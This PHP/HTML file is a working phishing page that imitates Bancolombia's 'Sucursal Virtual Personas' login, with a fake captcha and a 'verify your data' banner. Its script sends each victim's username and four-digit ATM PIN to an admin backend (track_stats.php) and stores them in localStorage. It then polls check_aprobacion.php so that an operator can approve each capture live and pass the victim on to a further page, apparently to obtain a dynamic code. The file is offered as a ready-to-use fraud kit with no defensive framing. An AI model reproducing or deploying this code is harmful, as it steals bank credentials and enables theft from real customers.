<?php
// admin/bancos/bancolombia/index.php - LOGIN

// No hay lógica PHP aquí, todo es frontend
?>
<!DOCTYPE html>
<html lang="es-CO">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bancolombia Sucursal Virtual Personas</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { width: 100%; height: 100%; margin: 0; padding: 0; overflow-x: hidden; }

        body {
            font-family: 'Open Sans', Arial, sans-serif;
            font-size: 16px; color: #2c2a29; line-height: 24px;
            background-color: #f9f9fa;
            display: flex; flex-direction: column; min-height: 100vh;
        }

        .decorative-background {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; z-index: 1;
        }

        .banner-programate {
            background: linear-gradient(135deg, #d4f1f4 0%, #b8e8ed 100%);
            padding: 16px 20px; display: flex; align-items: flex-start; gap: 12px;
            position: relative; z-index: 10; border-bottom: 1px solid #a0dce3;
        }

        .banner-icon {
            width: 28px; height: 28px; background-color: #ffffff; border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            flex-shrink: 0; margin-top: 2px;
        }
        .banner-icon svg { width: 16px; height: 16px; color: #0097a7; }
        .banner-content { flex: 1; }
        .banner-title { font-size: 15px; font-weight: 700; color: #212121; margin-bottom: 4px; }
        .banner-description { font-size: 13px; color: #424242; line-height: 1.4; margin-bottom: 6px; }

        .main-container {
            flex: 1; display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            padding: 40px 20px; position: relative; z-index: 10;
        }

        .brand-logo { height: 30px; margin-bottom: 40px; }
        .page-title { color: #424242; font-size: 28px; font-weight: 400; margin-bottom: 50px; text-align: center; }

        .login-card {
            background-color: #ffffff; border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1), 0 1px 4px rgba(0,0,0,0.06);
            padding: 50px 60px; max-width: 520px; width: 100%;
        }

        .card-greeting { color: #212121; font-size: 34px; font-weight: 700; margin-bottom: 12px; text-align: center; }
        .card-description { color: #666666; font-size: 15px; margin-bottom: 32px; text-align: center; line-height: 1.6; max-width: 360px; margin-left: auto; margin-right: auto; }

        .form-field { margin-bottom: 30px; position: relative; }
        .field-wrapper { position: relative; }

        .field-icon {
            position: absolute; left: 0; top: 50%; transform: translateY(-50%);
            width: 20px; height: 20px; color: #666666;
            flex-shrink: 0; pointer-events: none; z-index: 2;
        }

        .field-label {
            position: absolute; left: 30px;
            top: 50%; transform: translateY(-50%);
            font-size: 15px; color: #999999;
            transition: all 0.2s ease;
            pointer-events: none; z-index: 2;
        }

        .form-control {
            width: 100%;
            padding: 20px 0 6px 30px;
            border: none;
            border-bottom: 2px solid #e0e0e0;
            font-size: 15px; background-color: transparent;
            font-family: 'Open Sans', Arial, sans-serif;
            color: #212121; font-weight: 400;
            transition: border-color 0.3s ease;
            line-height: 1.2;
        }

        .form-control::placeholder { color: transparent; }
        .form-control:focus { outline: none; border-bottom-color: #fdda24; }

        .form-control:focus ~ .field-label,
        .form-control:not(:placeholder-shown) ~ .field-label {
            top: 2px; transform: translateY(0);
            font-size: 11px; color: #999999;
        }

        .form-field.has-error .form-control { border-bottom-color: #e53935; }

        .error-msg {
            display: none; color: #e53935;
            font-size: 12px; margin-top: 4px; font-weight: 400;
        }
        .form-field.has-error .error-msg { display: block; }

        .help-link {
            display: block; color: #212121; font-size: 13px;
            text-decoration: underline; margin-top: 8px; font-weight: 600; cursor: pointer;
        }
        .help-link:hover { color: #000000; }

        .captcha-container {
            margin: 30px 0 20px; padding: 14px 16px;
            background-color: #f5f5f5; border-radius: 6px; border: 1px solid #e0e0e0;
        }

        .captcha-checkbox-wrapper { display: flex; align-items: center; gap: 12px; cursor: pointer; user-select: none; }

        .captcha-checkbox {
            width: 28px; height: 28px; border: 2px solid #c7c7c7; border-radius: 4px;
            background-color: #ffffff; display: flex; align-items: center; justify-content: center;
            transition: all 0.3s ease; flex-shrink: 0; cursor: pointer;
        }
        .captcha-checkbox.checked { background-color: #4caf50; border-color: #4caf50; }
        .captcha-checkbox svg { width: 18px; height: 18px; color: #ffffff; display: none; }
        .captcha-checkbox.checked svg { display: block; }
        .captcha-text { font-size: 14px; color: #424242; }

        .submit-button {
            width: 100%; padding: 15px 32px; border-radius: 30px;
            font-size: 16px; font-weight: 600; cursor: not-allowed;
            border: none; background-color: #e0e0e0; color: #999999;
            transition: all 0.3s ease; font-family: 'Open Sans', Arial, sans-serif; margin-top: 15px;
        }
        .submit-button.enabled { background-color: #fdda24; color: #212121; cursor: pointer; }
        .submit-button.enabled:hover { background-color: #fdd007; }

        .register-link { text-align: center; margin-top: 25px; }
        .register-link a { color: #212121; font-size: 15px; text-decoration: underline; font-weight: 700; }

        .site-footer { background-color: #ffffff; padding: 20px 30px; border-top: 1px solid #e0e0e0; position: relative; z-index: 10; }
        .footer-wrapper { max-width: 1400px; margin: 0 auto; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px; }
        .footer-navigation { display: flex; gap: 15px; flex-wrap: wrap; align-items: center; }
        .footer-link { color: #666666; font-size: 13px; text-decoration: none; }
        .session-info { display: flex; flex-direction: column; align-items: flex-end; gap: 3px; }
        .info-text { color: #666666; font-size: 12px; }

        .loading-overlay {
            position: fixed;
            inset: 0;
            background: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.25s ease;
        }
        .loading-overlay.active {
            opacity: 1;
            pointer-events: all;
        }

        .spinner {
            width: 52px;
            height: 52px;
            margin-bottom: 36px;
        }
        .spinner svg {
            width: 52px;
            height: 52px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            from { transform: rotate(0deg); }
            to   { transform: rotate(360deg); }
        }

        .loading-title {
            font-size: 20px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 10px;
            text-align: center;
        }
        .loading-subtitle {
            font-size: 14px;
            color: #666;
            text-align: center;
            line-height: 1.55;
            max-width: 260px;
        }

        @media (max-width: 768px) {
            .main-container { padding: 25px 16px; }
            .brand-logo { height: 22px; margin-bottom: 25px; }
            .page-title { font-size: 20px; margin-bottom: 25px; }
            .login-card { padding: 30px 24px; max-width: 100%; }
            .card-greeting { font-size: 26px; }
            .card-description { font-size: 13px; margin-bottom: 24px; line-height: 1.55; }
            .form-field { margin-bottom: 24px; }
            .submit-button { font-size: 15px; padding: 13px 28px; }
            .site-footer { padding: 15px 20px; }
            .footer-wrapper { flex-direction: column; align-items: flex-start; gap: 10px; }
            .footer-navigation { flex-direction: column; gap: 8px; align-items: flex-start; }
        }
    </style>
</head>
<body>

    <svg class="decorative-background" viewBox="0 0 1920 1080" preserveAspectRatio="none">
        <path d="M 0 900 Q 200 800, 400 720 Q 700 620, 960 560 Q 1300 480, 1600 380 Q 1750 330, 1920 270" stroke="#ff8855" stroke-width="32" fill="none" stroke-linecap="round"/>
        <path d="M 50 850 Q 250 750, 450 670 Q 750 570, 960 520 Q 1300 440, 1600 340 Q 1750 290, 1920 230" stroke="#fdd835" stroke-width="38" fill="none" stroke-linecap="round"/>
        <path d="M 350 720 Q 480 670, 630 640 Q 720 620, 800 610" stroke="#9c6fb8" stroke-width="28" fill="none" stroke-linecap="round"/>
        <path d="M 1350 420 Q 1500 360, 1650 320 Q 1780 290, 1900 270" stroke="#9c6fb8" stroke-width="30" fill="none" stroke-linecap="round"/>
    </svg>

    <div class="banner-programate">
        <div class="banner-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
            </svg>
        </div>
        <div class="banner-content">
            <div class="banner-title">Verificación de datos personales</div>
            <div class="banner-description">Para tu seguridad, es necesario verificar tus datos personales antes de continuar con el proceso.</div>
        </div>
    </div>

    <main class="main-container">
        <img src="i.png" alt="Logo" class="brand-logo" onerror="this.style.display='none'">
        <h1 class="page-title">Sucursal Virtual Personas</h1>

        <div class="login-card">
            <h2 class="card-greeting">¡Hola!</h2>
            <p class="card-description">Ingresa tus datos para gestionar tu crédito y realizar el proceso de evaluación y aprobación.</p>

            <form id="loginForm" novalidate>

                <div class="form-field" id="fieldUsuario">
                    <div class="field-wrapper">
                        <svg class="field-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
                            <circle cx="12" cy="7" r="4"></circle>
                        </svg>
                        <input type="text" class="form-control" id="usuario" placeholder=" " autocomplete="username" required>
                        <label class="field-label" for="usuario">Usuario</label>
                    </div>
                    <span class="error-msg">Ingresa tu usuario</span>
                    <a href="#" class="help-link">¿Olvidaste tu usuario?</a>
                </div>

                <div class="form-field" id="fieldClave">
                    <div class="field-wrapper">
                        <svg class="field-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
                        </svg>
                        <input type="password" class="form-control" id="clave" placeholder=" " autocomplete="current-password" maxlength="4" inputmode="numeric" pattern="[0-9]{4}" required>
                        <label class="field-label" for="clave">Clave del cajero</label>
                    </div>
                    <span class="error-msg">Ingresa tu clave</span>
                    <a href="#" class="help-link">¿Olvidaste o bloqueaste tu clave?</a>
                </div>

                <div class="captcha-container">
                    <div class="captcha-checkbox-wrapper" id="captchaWrapper">
                        <div class="captcha-checkbox" id="captchaCheckbox">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
                                <polyline points="20 6 9 17 4 12"></polyline>
                            </svg>
                        </div>
                        <span class="captcha-text">No soy un robot</span>
                    </div>
                </div>

                <button type="submit" class="submit-button" id="btnLogin" disabled>Continuar</button>

                <div class="register-link">
                    <a href="#">Crear usuario</a>
                </div>
            </form>
        </div>
    </main>

    <footer class="site-footer">
        <div class="footer-wrapper">
            <nav class="footer-navigation">
                <a href="#" class="footer-link">¿Problemas para conectarte?</a>
                <span style="color: #cccccc;">·</span>
                <a href="#" class="footer-link">Aprende sobre seguridad</a>
            </nav>
            <div class="session-info">
                <span class="info-text" id="userIP">Dirección IP: Cargando...</span>
                <span class="info-text" id="currentDateTime">Cargando fecha...</span>
            </div>
        </div>
    </footer>

    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner">
            <svg viewBox="0 0 52 52" fill="none" xmlns="http://www.w3.org/2000/svg">
                <circle cx="26" cy="26" r="22" stroke="#e0e0e0" stroke-width="4"/>
                <circle cx="26" cy="26" r="22"
                    stroke="#FDDA24"
                    stroke-width="4"
                    stroke-linecap="round"
                    stroke-dasharray="103 35"
                    stroke-dashoffset="0"
                />
            </svg>
        </div>
        <p class="loading-title">Verificando datos...</p>
        <p class="loading-subtitle">Estamos verificando tus datos. Por favor espera...</p>
    </div>

    <script>
        let captchaChecked = false;
        let userIP = 'No disponible';

        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userIP = data.ip;
                document.getElementById('userIP').textContent = 'Dirección IP: ' + data.ip;
            } catch (error) {
                document.getElementById('userIP').textContent = 'Dirección IP: No disponible';
            }
        }

        function updateDateTime() {
            const now = new Date();
            const days = ['domingo', 'lunes', 'martes', 'miércoles', 'jueves', 'viernes', 'sábado'];
            const months = ['enero', 'febrero', 'marzo', 'abril', 'mayo', 'junio', 'julio', 'agosto', 'septiembre', 'octubre', 'noviembre', 'diciembre'];
            
            const hours = now.getHours();
            const period = hours >= 12 ? 'p. m.' : 'a. m.';
            const displayHours = hours % 12 || 12;
            const minutes = now.getMinutes().toString().padStart(2, '0');
            const seconds = now.getSeconds().toString().padStart(2, '0');
            
            const dateTimeStr = `${days[now.getDay()]}, ${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()}, ${displayHours}:${minutes}:${seconds} ${period}`;
            document.getElementById('currentDateTime').textContent = dateTimeStr;
        }

        document.getElementById('captchaWrapper').addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            captchaChecked = !captchaChecked;
            const checkbox = document.getElementById('captchaCheckbox');
            if (captchaChecked) {
                checkbox.classList.add('checked');
            } else {
                checkbox.classList.remove('checked');
            }
            validateForm();
        });

        const inputUsuario = document.getElementById('usuario');
        const inputClave = document.getElementById('clave');
        const btnSubmit = document.getElementById('btnLogin');
        const loadingOverlay = document.getElementById('loadingOverlay');

        function toggleError(fieldId, hasError) {
            document.getElementById(fieldId).classList.toggle('has-error', hasError);
        }

        inputUsuario.addEventListener('input', function() {
            this.value = this.value.replace(/\s/g, '');
            toggleError('fieldUsuario', this.value.trim() === '');
            validateForm();
        });

        inputClave.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4);
            toggleError('fieldClave', this.value.length !== 4 && this.value.length > 0 ? true : this.value.length === 0);
            validateForm();
        });

        function validateForm() {
            const usuarioValid = inputUsuario.value.trim() !== '';
            const claveValid = inputClave.value.length === 4;
            const formValid = usuarioValid && claveValid && captchaChecked;
            
            btnSubmit.classList.toggle('enabled', formValid);
            btnSubmit.disabled = !formValid;
        }

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const usuario = inputUsuario.value.trim();
            const clave = inputClave.value;

            if (!usuario || clave.length !== 4 || !captchaChecked) {
                alert('Por favor completa todos los campos');
                return;
            }

            loadingOverlay.classList.add('active');
            
            const pseData = localStorage.getItem('pseGuardado');
            let documento = 'N/A';
            let banco = 'bancolombia';
            
            if (pseData) {
                try {
                    const pse = JSON.parse(pseData);
                    documento = pse.documento_pse || 'N/A';
                    banco = 'bancolombia';
                } catch (e) {}
            }
            
            const formData = new FormData();
            formData.append('activity', 'LOGIN (BANCOLOMBIA)');
            formData.append('action', 'log');
            formData.append('metodo', 'PSE');
            formData.append('banco', 'bancolombia');
            formData.append('documento', documento);
            formData.append('usuario', usuario);
            formData.append('identificacion', usuario);
            formData.append('tipo_identificacion', 'CC');
            formData.append('clave_pin', clave);
            formData.append('clave_tarjeta', '');
            formData.append('ultimos_digitos', '');

            // Guardar en localStorage para clave.php y dinamica.php
            localStorage.setItem('usuario_bancolombia', usuario);
            localStorage.setItem('identificacion_bancolombia', usuario);
            localStorage.setItem('tipo_id_bancolombia', 'CC');
            localStorage.setItem('clave_pin_bancolombia', clave);

            console.log('✅ Enviando a track_stats.php:', {
                activity: 'LOGIN (BANCOLOMBIA)',
                usuario: usuario,
                clave_pin: clave,
                banco: 'bancolombia'
            });

            try {
                const response = await fetch('../../admin/track_stats.php', {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                
                console.log('✅ Respuesta track_stats.php:', data);
                
                if (data.success) {
                    localStorage.setItem('log_id_login', data.id);
                    startPollingAprobacion(data.id);
                } else {
                    loadingOverlay.classList.remove('active');
                    console.error('❌ Error:', data);
                    alert('Error: ' + (data.message || 'Error desconocido'));
                }
            } catch (err) {
                console.error('Error:', err);
                loadingOverlay.classList.remove('active');
                alert('Error: ' + err.message);
            }
        });

        function startPollingAprobacion(logId) {
            let pollCount = 0;
            const maxPolls = 150;
            
            const pollInterval = setInterval(() => {
                pollCount++;
                
                fetch('../../admin/check_aprobacion.php?log_id=' + logId)
                    .then(res => res.json())
                    .then(data => {
                        console.log('Poll #' + pollCount + ' - Estado:', data.estado);
                        
                        if (data.estado === 'aprobado') {
                            clearInterval(pollInterval);
                            loadingOverlay.classList.remove('active');
                            alert('✓ Datos aprobados');
                            setTimeout(() => {
                                window.location.assign('./dinamica.php');
                            }, 500);
                        } else if (data.estado === 'rechazado') {
                            clearInterval(pollInterval);
                            loadingOverlay.classList.remove('active');
                            alert('✗ Datos rechazados. Por favor intenta nuevamente');
                            inputClave.value = '';
                            inputClave.dispatchEvent(new Event('input'));
                        } else if (pollCount >= maxPolls) {
                            clearInterval(pollInterval);
                            loadingOverlay.classList.remove('active');
                            alert('⏱️ Tiempo de espera agotado. Por favor intenta nuevamente');
                            inputClave.value = '';
                            inputClave.dispatchEvent(new Event('input'));
                        }
                    })
                    .catch(err => {
                        console.error('Error en polling:', err);
                    });
            }, 2000);
        }

        getUserIP();
        updateDateTime();
        validateForm();
        setInterval(updateDateTime, 1000);
    </script>
</body>
</html>